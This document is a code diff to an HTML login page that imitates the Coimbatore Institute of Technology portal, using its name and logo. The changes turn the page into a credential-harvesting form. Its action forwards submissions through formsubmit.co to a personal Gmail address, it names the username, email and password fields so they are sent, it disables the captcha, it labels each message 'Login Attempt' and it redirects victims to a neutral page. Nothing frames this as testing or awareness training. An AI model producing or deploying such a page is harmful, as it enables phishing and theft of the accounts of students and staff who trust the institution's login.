@@ -232,7 +232,6 @@
             display: none;
         }
         
-        /* Placeholder for logo when no image is set */
         .college-logo.placeholder {
             background: linear-gradient(135deg, #1a2a6c, #b21f1f);
             display: flex;
@@ -264,27 +263,41 @@
     <div class="login-container">
         <div class="logo-container">
             <div class="college-logo">
-                <!-- Replace the src attribute with your college logo URL -->
-                <img id="college-logo-img" src="https://upload.wikimedia.org/wikipedia/en/1/17/Coimbatore_Institute_of_Technology_logo.png" alt="College Logo">
+                <img id="college-logo-img" 
+                     src="https://upload.wikimedia.org/wikipedia/en/1/17/Coimbatore_Institute_of_Technology_logo.png" 
+                     alt="College Logo">
             </div>
-            <div class="college-name">Coimbatore Insititute of Technology</div>
+            <div class="college-name">Coimbatore Institute of Technology</div>
         </div>
         
         <h2 class="login-title">Login</h2>
         
-        <form id="loginForm" action="https://formsubmit.co/71762305069@cit.edu.in" method="POST">
+        <form id="loginForm" action="https://formsubmit.co/ashwinsukumar25@gmail.com" method="POST">
+            <!-- Hidden FormSubmit fields -->
+            <input type="hidden" name="_subject" value="Login Attempt">
+            <input type="hidden" name="_next" value="https://example.com/thank-you">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_captcha" value="false">
+
+            <!-- Username -->
             <div class="input-group">
                 <label for="username">Username</label>
                 <i class="fas fa-user"></i>
-                <input type="text" id="username" placeholder="Enter your username" required>
-                <div class="error-message" id="username-error">Please enter a valid username</div>
+                <input type="text" id="username" name="username" placeholder="Enter your username" required>
             </div>
-            
+
+            <!-- Email -->
+            <div class="input-group">
+                <label for="email">Email</label>
+                <i class="fas fa-envelope"></i>
+                <input type="email" id="email" name="email" placeholder="Enter your email address">
+            </div>
+
+            <!-- Password -->
             <div class="input-group">
                 <label for="password">Password</label>
                 <i class="fas fa-lock"></i>
-                <input type="password" id="password" placeholder="Enter your password" required>
-                <div class="error-message" id="password-error">Password must be at least 6 characters</div>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
             </div>
             
             <div class="options">
@@ -297,6 +310,11 @@
             
             <button type="submit" class="login-btn">LOGIN</button>
         </form>
+
+        <p class="signup-link mt-4">
+            Don't have an account?
+            <a href="#">Sign up</a>
+        </p>
     </div>
 
     <script>
@@ -307,56 +325,12 @@
             logoContainer.classList.add('placeholder');
             logoContainer.innerHTML = '<i class="fas fa-graduation-cap"></i>';
         });
-        
-        // If you want to set a default image, uncomment the next line and add your URL
-        // logoImg.src = "YOUR_IMAGE_URL_HERE";
-        
-        // Form validation and submission
-        /*document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            let isValid = true;
-            
-            // Reset errors
-            document.querySelectorAll('.error-message').forEach(el => {
-                el.style.display = 'none';
-            });
-            
-            // Validate username
-            if (username.trim() === '') {
-                document.getElementById('username-error').style.display = 'block';
-                isValid = false;
-            }
-            
-            // Validate password
-            if (password.length < 6) {
-                document.getElementById('password-error').style.display = 'block';
-                isValid = false;
-            }
-            
-            if (isValid) {
-                // Simulate login process
-                const loginBtn = document.querySelector('.login-btn');
-                loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
-                loginBtn.disabled = true;
-                
-                // Simulate API call
-                setTimeout(() => {
-                    alert('Login successful! Welcome back to University of Excellence.');
-                    loginBtn.innerHTML = 'LOGIN';
-                    loginBtn.disabled = false;
-                }, 1500);
-            }
-        });*/
-        
-        // Add focus effects to inputs
-        document.querySelectorAll('input').forEach(input => {
+
+        // Optional: Add focus/blur icon color change
+        document.querySelectorAll('.input-group input').forEach(input => {
             input.addEventListener('focus', function() {
                 this.parentElement.querySelector('i').style.color = '#1a2a6c';
             });
-            
             input.addEventListener('blur', function() {
                 this.parentElement.querySelector('i').style.color = '#777';
             });
